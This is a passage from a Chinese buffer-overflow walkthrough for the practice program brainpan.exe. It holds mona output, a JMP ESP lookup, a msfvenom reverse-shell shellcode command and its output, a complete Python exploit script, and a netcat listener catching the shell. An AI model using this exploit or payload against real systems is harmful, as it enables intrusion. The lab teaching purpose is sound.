modules\u003c/code\u003e可以查看当前程序保护机制\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e0BADF00D   ----------------------------------------------------------------------------------------------------------------------------------------------\n0BADF00D    Module info :\n0BADF00D   ----------------------------------------------------------------------------------------------------------------------------------------------\n0BADF00D    Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Version, Modulename \u0026#x26; Path, DLLCharacteristics\n0BADF00D   ----------------------------------------------------------------------------------------------------------------------------------------------\n0BADF00D    \u003cspan class=\"hljs-number\"\u003e0x76750000\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e0x7694c000\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e0x001fc000\u003c/span\u003e | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e   | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e    | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e  | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e  |  \u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e   | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e   | \u003cspan class=\"hljs-number\"\u003e10.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.18362\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.329\u003c/span\u003e [KERNELBASE.dll] (C:\\Windows\\System32\\KERNELBASE.dll) \u003cspan class=\"hljs-number\"\u003e0x4140\u003c/span\u003e\n0BADF00D    \u003cspan class=\"hljs-number\"\u003e0x77100000\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e0x7715e000\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e0x0005e000\u003c/span\u003e | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e   | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e    | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e  | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e  |  \u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e   | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e   | \u003cspan class=\"hljs-number\"\u003e10.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.18362\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e [WS2_32.DLL] (C:\\Windows\\System32\\WS2_32.DLL) \u003cspan class=\"hljs-number\"\u003e0x4140\u003c/span\u003e\n0BADF00D    \u003cspan class=\"hljs-number\"\u003e0x76950000\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e0x769af000\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e0x0005f000\u003c/span\u003e | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e   | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e    | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e  | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e  |  \u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e   | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e   | \u003cspan class=\"hljs-number\"\u003e10.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.18362\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.295\u003c/span\u003e [bcryptPrimitives.dll] (C:\\Windows\\System32\\bcryptPrimitives.dll) \u003cspan class=\"hljs-number\"\u003e0x41c0\u003c/span\u003e\n0BADF00D    \u003cspan class=\"hljs-number\"\u003e0x77000000\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e0x770e0000\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e0x000e0000\u003c/span\u003e | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e   | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e    | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e  | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e  |  \u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e   | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e   | \u003cspan class=\"hljs-number\"\u003e10.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.18362\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.329\u003c/span\u003e [KERNEL32.DLL] (C:\\Windows\\System32\\KERNEL32.DLL) \u003cspan class=\"hljs-number\"\u003e0x4140\u003c/span\u003e\n0BADF00D    \u003cspan class=\"hljs-number\"\u003e0x761c0000\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e0x7627f000\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e0x000bf000\u003c/span\u003e | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e   | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e    | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e  | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e  |  \u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e   | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e   | \u003cspan class=\"hljs-number\"\u003e7.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.18362\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e [msvcrt.dll] (C:\\Windows\\System32\\msvcrt.dll) \u003cspan class=\"hljs-number\"\u003e0x4140\u003c/span\u003e\n0BADF00D    \u003cspan class=\"hljs-number\"\u003e0x75090000\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e0x7509a000\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e0x0000a000\u003c/span\u003e | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e   | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e    | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e  | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e  |  \u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e   | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e   | \u003cspan class=\"hljs-number\"\u003e10.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.18362\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e [CRYPTBASE.dll] (C:\\Windows\\System32\\CRYPTBASE.dll) \u003cspan class=\"hljs-number\"\u003e0x4540\u003c/span\u003e\n0BADF00D    \u003cspan class=\"hljs-number\"\u003e0x750a0000\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e0x750c0000\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e0x00020000\u003c/span\u003e | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e   | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e    | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e  | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e  |  \u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e   | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e   | \u003cspan class=\"hljs-number\"\u003e10.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.18362\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e [SspiCli.dll] (C:\\Windows\\System32\\SspiCli.dll) \u003cspan class=\"hljs-number\"\u003e0x4140\u003c/span\u003e\n0BADF00D    \u003cspan class=\"hljs-number\"\u003e0x778d0000\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e0x77a6a000\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e0x0019a000\u003c/span\u003e | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e   | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e    | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e  | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e  |  \u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e   | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e   | \u003cspan class=\"hljs-number\"\u003e10.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.18362\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.329\u003c/span\u003e [ntdll.dll] (C:\\Windows\\SYSTEM32\\ntdll.dll) \u003cspan class=\"hljs-number\"\u003e0x4140\u003c/span\u003e\n0BADF00D    \u003cspan class=\"hljs-number\"\u003e0x31170000\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e0x31176000\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e0x00006000\u003c/span\u003e | \u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e  | \u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e   | \u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e | \u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e |  \u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e   | \u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e  | -\u003cspan class=\"hljs-number\"\u003e1.0\u003c/span\u003e- [brainpan.exe] (C:\\Users\\ensp\\Desktop\\brainpan.exe) \u003cspan class=\"hljs-number\"\u003e0x0\u003c/span\u003e\n0BADF00D    \u003cspan class=\"hljs-number\"\u003e0x750e0000\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e0x7519b000\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e0x000bb000\u003c/span\u003e | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e   | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e    | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e  | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e  |  \u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e   | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e   | \u003cspan class=\"hljs-number\"\u003e10.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.18362\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e [RPCRT4.dll] (C:\\Windows\\System32\\RPCRT4.dll) \u003cspan class=\"hljs-number\"\u003e0x4140\u003c/span\u003e\n0BADF00D    \u003cspan class=\"hljs-number\"\u003e0x76ec0000\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e0x76f36000\u003c/span\u003e | \u003cspan class=\"hljs-number\"\u003e0x00076000\u003c/span\u003e | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e   | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e    | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e  | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e  |  \u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e   | \u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e   | \u003cspan class=\"hljs-number\"\u003e10.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.18362\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e [sechost.dll] (C:\\Windows\\System32\\sechost.dll) \u003cspan class=\"hljs-number\"\u003e0x4140\u003c/span\u003e\n0BADF00D   -----------------------------------------------------------------------------------------------------------------------------------------\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003ebrainpan.exe\u003c/code\u003e没有任何保护，很容易被利用，所以我们就在该文件里面寻找\u003ccode\u003eJMP ESP\u003c/code\u003e (其实不一定要用brainpan.exe的JMP ESP，其他未开启保护机制的程序也可以，但是其他程序现在难以定位)\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e定位输入框输入 ：\u003ccode\u003e!mona find -s  \"\\xff\\xe4\"  -m brainpan.exe\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eResults :\n\u003cspan class=\"hljs-number\"\u003e0x311712f3\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e\"\\xff\\xe4\"\u003c/span\u003e |  {PAGE_EXECUTE_READ} [brainpan.exe] ASLR: \u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e, Rebase: \u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e, SafeSEH: \u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e, CFG: \u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e, OS: \u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e, v-\u003cspan class=\"hljs-number\"\u003e1.0\u003c/span\u003e- (C:\\Users\\ensp\\Desktop\\brainpan.exe), \u003cspan class=\"hljs-number\"\u003e0x0\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e0x311712f3\u003c/code\u003e地址下存放JMP ESP指令，因为是小端显示所以需要以倒叙的插入\u003ccode\u003e\\xf3\\x12\\x17\\x31\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e插入shellcode\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e使用msfvenom生成\u003c/p\u003e\n\u003cp\u003e-p 为 payload -b 指定坏字符 -e 指定编码 -f 格式化输出为python语言\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsfvenom -p windows/shell_reverse_tcp LHOST=\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.151\u003c/span\u003e LPORT=\u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e -e x86/shikata_ga_nai -b \u003cspan class=\"hljs-string\"\u003e\"\\x00\\x0a\\x0d\"\u003c/span\u003e -f python\n//\n[-] No platform was selected, choosing Msf::Module::Platform::Windows \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e the payload\n[-] No arch selected, selecting arch: x86 \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e the payload\nFound \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e compatible encoders\nAttempting to encode payload \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e size \u003cspan class=\"hljs-number\"\u003e351\u003c/span\u003e (iteration=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e)\nx86/shikata_ga_nai chosen \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e final size \u003cspan class=\"hljs-number\"\u003e351\u003c/span\u003e\nPayload size: \u003cspan class=\"hljs-number\"\u003e351\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e\nFinal size of python file: \u003cspan class=\"hljs-number\"\u003e1745\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e\nbuf =  \u003cspan class=\"hljs-string\"\u003eb\"\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xd9\\xc2\\xd9\\x74\\x24\\xf4\\xba\\xb3\\xbf\\xd6\\xb2\\x58\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x31\\xc9\\xb1\\x52\\x31\\x50\\x17\\x03\\x50\\x17\\x83\\x73\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xbb\\x34\\x47\\x8f\\x2c\\x3a\\xa8\\x6f\\xad\\x5b\\x20\\x8a\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x9c\\x5b\\x56\\xdf\\x8f\\x6b\\x1c\\x8d\\x23\\x07\\x70\\x25\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xb7\\x65\\x5d\\x4a\\x70\\xc3\\xbb\\x65\\x81\\x78\\xff\\xe4\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x01\\x83\\x2c\\xc6\\x38\\x4c\\x21\\x07\\x7c\\xb1\\xc8\\x55\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xd5\\xbd\\x7f\\x49\\x52\\x8b\\x43\\xe2\\x28\\x1d\\xc4\\x17\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xf8\\x1c\\xe5\\x86\\x72\\x47\\x25\\x29\\x56\\xf3\\x6c\\x31\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xbb\\x3e\\x26\\xca\\x0f\\xb4\\xb9\\x1a\\x5e\\x35\\x15\\x63\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x6e\\xc4\\x67\\xa4\\x49\\x37\\x12\\xdc\\xa9\\xca\\x25\\x1b\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xd3\\x10\\xa3\\xbf\\x73\\xd2\\x13\\x1b\\x85\\x37\\xc5\\xe8\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x89\\xfc\\x81\\xb6\\x8d\\x03\\x45\\xcd\\xaa\\x88\\x68\\x01\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x3b\\xca\\x4e\\x85\\x67\\x88\\xef\\x9c\\xcd\\x7f\\x0f\\xfe\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xad\\x20\\xb5\\x75\\x43\\x34\\xc4\\xd4\\x0c\\xf9\\xe5\\xe6\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xcc\\x95\\x7e\\x95\\xfe\\x3a\\xd5\\x31\\xb3\\xb3\\xf3\\xc6\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xb4\\xe9\\x44\\x58\\x4b\\x12\\xb5\\x71\\x88\\x46\\xe5\\xe9\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x39\\xe7\\x6e\\xe9\\xc6\\x32\\x20\\xb9\\x68\\xed\\x81\\x69\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xc9\\x5d\\x6a\\x63\\xc6\\x82\\x8a\\x8c\\x0c\\xab\\x21\\x77\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xc7\\x14\\x1d\\x3c\\x80\\xfd\\x5c\\xc2\\xaa\\x2f\\xe9\\x24\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xd8\\xdf\\xbc\\xff\\x75\\x79\\xe5\\x8b\\xe4\\x86\\x33\\xf6\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x27\\x0c\\xb0\\x07\\xe9\\xe5\\xbd\\x1b\\x9e\\x05\\x88\\x41\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x09\\x19\\x26\\xed\\xd5\\x88\\xad\\xed\\x90\\xb0\\x79\\xba\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xf5\\x07\\x70\\x2e\\xe8\\x3e\\x2a\\x4c\\xf1\\xa7\\x15\\xd4\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x2e\\x14\\x9b\\xd5\\xa3\\x20\\xbf\\xc5\\x7d\\xa8\\xfb\\xb1\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xd1\\xff\\x55\\x6f\\x94\\xa9\\x17\\xd9\\x4e\\x05\\xfe\\x8d\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x17\\x65\\xc1\\xcb\\x17\\xa0\\xb7\\x33\\xa9\\x1d\\x8e\\x4c\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x06\\xca\\x06\\x35\\x7a\\x6a\\xe8\\xec\\x3e\\x9a\\xa3\\xac\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x17\\x33\\x6a\\x25\\x2a\\x5e\\x8d\\x90\\x69\\x67\\x0e\\x10\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x12\\x9c\\x0e\\x51\\x17\\xd8\\x88\\x8a\\x65\\x71\\x7d\\xac\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xda\\x72\\x54\"\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e因为我们加密呢，会生成几个桩来解码，中间需要多加几个\u003cstrong\u003e啥也不做的指令NOP（\\x90）\u003c/strong\u003e，称为slide，防止“桩”被抹掉导致代码无法成功执行\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e socket\nbuf =  \u003cspan class=\"hljs-string\"\u003eb\"\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xd9\\xc2\\xd9\\x74\\x24\\xf4\\xba\\xb3\\xbf\\xd6\\xb2\\x58\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x31\\xc9\\xb1\\x52\\x31\\x50\\x17\\x03\\x50\\x17\\x83\\x73\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xbb\\x34\\x47\\x8f\\x2c\\x3a\\xa8\\x6f\\xad\\x5b\\x20\\x8a\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x9c\\x5b\\x56\\xdf\\x8f\\x6b\\x1c\\x8d\\x23\\x07\\x70\\x25\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xb7\\x65\\x5d\\x4a\\x70\\xc3\\xbb\\x65\\x81\\x78\\xff\\xe4\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x01\\x83\\x2c\\xc6\\x38\\x4c\\x21\\x07\\x7c\\xb1\\xc8\\x55\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xd5\\xbd\\x7f\\x49\\x52\\x8b\\x43\\xe2\\x28\\x1d\\xc4\\x17\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xf8\\x1c\\xe5\\x86\\x72\\x47\\x25\\x29\\x56\\xf3\\x6c\\x31\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xbb\\x3e\\x26\\xca\\x0f\\xb4\\xb9\\x1a\\x5e\\x35\\x15\\x63\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x6e\\xc4\\x67\\xa4\\x49\\x37\\x12\\xdc\\xa9\\xca\\x25\\x1b\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xd3\\x10\\xa3\\xbf\\x73\\xd2\\x13\\x1b\\x85\\x37\\xc5\\xe8\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x89\\xfc\\x81\\xb6\\x8d\\x03\\x45\\xcd\\xaa\\x88\\x68\\x01\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x3b\\xca\\x4e\\x85\\x67\\x88\\xef\\x9c\\xcd\\x7f\\x0f\\xfe\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xad\\x20\\xb5\\x75\\x43\\x34\\xc4\\xd4\\x0c\\xf9\\xe5\\xe6\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xcc\\x95\\x7e\\x95\\xfe\\x3a\\xd5\\x31\\xb3\\xb3\\xf3\\xc6\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xb4\\xe9\\x44\\x58\\x4b\\x12\\xb5\\x71\\x88\\x46\\xe5\\xe9\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x39\\xe7\\x6e\\xe9\\xc6\\x32\\x20\\xb9\\x68\\xed\\x81\\x69\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xc9\\x5d\\x6a\\x63\\xc6\\x82\\x8a\\x8c\\x0c\\xab\\x21\\x77\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xc7\\x14\\x1d\\x3c\\x80\\xfd\\x5c\\xc2\\xaa\\x2f\\xe9\\x24\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xd8\\xdf\\xbc\\xff\\x75\\x79\\xe5\\x8b\\xe4\\x86\\x33\\xf6\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x27\\x0c\\xb0\\x07\\xe9\\xe5\\xbd\\x1b\\x9e\\x05\\x88\\x41\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x09\\x19\\x26\\xed\\xd5\\x88\\xad\\xed\\x90\\xb0\\x79\\xba\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xf5\\x07\\x70\\x2e\\xe8\\x3e\\x2a\\x4c\\xf1\\xa7\\x15\\xd4\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x2e\\x14\\x9b\\xd5\\xa3\\x20\\xbf\\xc5\\x7d\\xa8\\xfb\\xb1\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xd1\\xff\\x55\\x6f\\x94\\xa9\\x17\\xd9\\x4e\\x05\\xfe\\x8d\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x17\\x65\\xc1\\xcb\\x17\\xa0\\xb7\\x33\\xa9\\x1d\\x8e\\x4c\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x06\\xca\\x06\\x35\\x7a\\x6a\\xe8\\xec\\x3e\\x9a\\xa3\\xac\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x17\\x33\\x6a\\x25\\x2a\\x5e\\x8d\\x90\\x69\\x67\\x0e\\x10\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\x12\\x9c\\x0e\\x51\\x17\\xd8\\x88\\x8a\\x65\\x71\\x7d\\xac\"\u003c/span\u003e\nbuf += \u003cspan class=\"hljs-string\"\u003eb\"\\xda\\x72\\x54\"\u003c/span\u003e\na = \u003cspan class=\"hljs-string\"\u003eb'A'\u003c/span\u003e*\u003cspan class=\"hljs-number\"\u003e524\u003c/span\u003e+\u003cspan class=\"hljs-string\"\u003eb'\\xf3\\x12\\x17\\x31'\u003c/span\u003e+\u003cspan class=\"hljs-string\"\u003eb'\\x90'\u003c/span\u003e*\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e+buf\ns = socket.socket()\ns.connect((\u003cspan class=\"hljs-string\"\u003e'192.168.75.161'\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e9999\u003c/span\u003e))\nr = s.recv(\u003cspan class=\"hljs-number\"\u003e1024\u003c/span\u003e)\ns.send(a)\ns.close()\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e现在windows运行brainpan.exe，然后再运行py文件\u003c/p\u003e\n\u003cp\u003e获得测试机shell\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enc -lvp \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e\nlistening on [\u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e ...\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.161\u003c/span\u003e: inverse host lookup failed: Unknown host\nconnect to [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.151\u003c/span\u003e] \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e (UNKNOWN) [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.161\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e49967\u003c/span\u003e\nMicrosoft Windows [�汾 \u003cspan class=\"hljs-number\"\u003e10.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.18363\u003c/span\u003e\u003cspan 